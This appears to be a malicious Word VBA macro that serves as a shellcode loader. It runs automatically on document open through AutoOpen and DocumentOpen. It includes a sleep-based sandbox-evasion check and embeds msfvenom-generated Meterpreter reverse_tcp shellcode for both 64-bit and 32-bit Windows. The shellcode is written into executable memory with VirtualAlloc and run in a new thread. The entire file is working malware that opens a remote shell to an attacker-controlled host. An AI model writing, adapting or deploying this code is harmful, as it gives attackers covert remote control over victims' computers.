Type MODULE_INFORMATION
    BaseAddress As Long
    ImageSize As Long
    EntryPointAddress As Long
End Type

Private Declare PtrSafe Function Delay Lib "KERNEL32" Alias "Sleep" (ByVal milliseconds As Long) As Long
Private Declare PtrSafe Function AllocateThread Lib "KERNEL32" Alias "CreateThread" (ByVal SecAttributes As Long, ByVal StackBytes As Long, ByVal StartFunc As LongPtr, ThreadParam As LongPtr, ByVal Flags As Long, ByRef ThreadIdentifier As Long) As LongPtr
Private Declare PtrSafe Function MemoryAllocate Lib "KERNEL32" Alias "VirtualAlloc" (ByVal Address As LongPtr, ByVal Size As Long, ByVal AllocationType As Long, ByVal ProtectionType As Long) As LongPtr
Private Declare PtrSafe Function ProcAddress Lib "KERNEL32" Alias "GetProcAddress" (ByVal ModuleHandle As LongPtr, ByVal ProcName As String) As LongPtr
Private Declare PtrSafe Function ModifyProtection Lib "KERNEL32" Alias "VirtualProtect" (Address As Any, ByVal Size As LongPtr, ByVal NewProtection As LongPtr, OldProtection As LongPtr) As LongPtr
Private Declare PtrSafe Function ModuleHandle Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal ModuleName As String) As LongPtr
Private Declare PtrSafe Sub WriteMemory Lib "KERNEL32" Alias "RtlFillMemory" (Target As Any, ByVal Length As Long, ByVal Value As Byte)
Public Declare PtrSafe Function EnumerateModules Lib "psapi.dll" Alias "EnumProcessModulesEx" (ByVal ProcessHandle As LongPtr, ByVal ModuleArray As LongPtr, ByVal BufferBytes As LongPtr, ByVal BytesReturned As LongPtr, ByVal Flags As LongPtr) As LongPtr
Public Declare PtrSafe Function ModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal ProcessHandle As LongPtr, ByVal ModuleHandle As LongPtr, ByVal FileName As String, ByVal NameSize As LongPtr) As LongPtr

Function ExecutePayload()
    ' Timing check to detect sandbox environments
    Dim initialTime As Variant
    initialTime = Time
    Dim currentTime As Date
    currentTime = Date + initialTime
    Delay 4000 ' Pause for 4 seconds

    Dim elapsedTime As Variant
    elapsedTime = Time
    Dim finalTime As Date
    finalTime = Date + elapsedTime
    Dim timeDiff As Variant
    timeDiff = DateDiff("s", currentTime, finalTime)

    If timeDiff < 3.5 Then
        Exit Function ' Exit if sandbox is detected
    End If

    ' Shellcode initialization
    Dim Is64Bit As Boolean
    Dim Payload As Variant
    Dim MemoryAddress As LongPtr
    Dim Index As LongPtr
    Dim HexValue As String
    Dim ThreadResult As LongPtr

' msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
    If Is64BitEnvironment Then
        Payload = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 77, 49, 201, 72, 139, 114, 80, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 72, 139, 82, 32, 65, 81, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 68, 139, 64, 32, 73, 1, 208, 139, 72, 24, 227, 86, 72, 255, 201, 65, 139, 52, 136, 77, 49, 201, 72, 1, 214, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 65, 88, 65, 88, 94, 72, 1, 208, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
188, 2, 0, 1, 187, 192, 168, 93, 128, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, _
88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, _
72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)

    Else
    ' msfvenom -p windows/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
        Payload = Array(252, 232, 143, 0, 0, 0, 96, 49, 210, 137, 229, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 49, 255, 15, 183, 74, 38, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 72, 24, 139, 88, 32, 80, 1, 211, 133, 201, 116, 60, 73, 49, _
255, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, _
104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 93, 128, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, _
106, 0, 106, 4, 86, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 54, 139, 54, 106, 64, 104, 0, 16, 0, 0, 86, 106, 0, 104, 88, 164, 83, 229, 255, 213, 147, 83, 106, 0, 86, 83, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 104, 0, 64, 0, 0, 106, 0, 80, 104, 11, 47, 15, 48, 255, 213, 87, 104, 117, 110, 77, 97, 255, 213, _
94, 94, 255, 12, 36, 15, 133, 112, 255, 255, 255, 233, 155, 255, 255, 255, 1, 195, 41, 198, 117, 193, 195, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
    End If

    ' Allocate memory in the current process
    MemoryAddress = MemoryAllocate(0, UBound(Payload), &H3000, &H40)

    ' Write the shellcode to the allocated memory
    For Index = LBound(Payload) To UBound(Payload)
        HexValue = Hex(Payload(Index))
        WriteMemory ByVal (MemoryAddress + Index), 1, ByVal ("&H" & HexValue)
    Next Index

    ' Create a thread to execute the shellcode
    ThreadResult = AllocateThread(0, 0, MemoryAddress, 0, 0, 0)
End Function

Function Is64BitEnvironment() As Boolean
    ' Determine the architecture of the process
    #If Win64 Then
        Is64BitEnvironment = True
    #Else
        Is64BitEnvironment = False
    #End If
End Function

Sub DocumentOpen()
    ExecutePayload
End Sub

Sub AutoOpen()
    ExecutePayload
End Sub

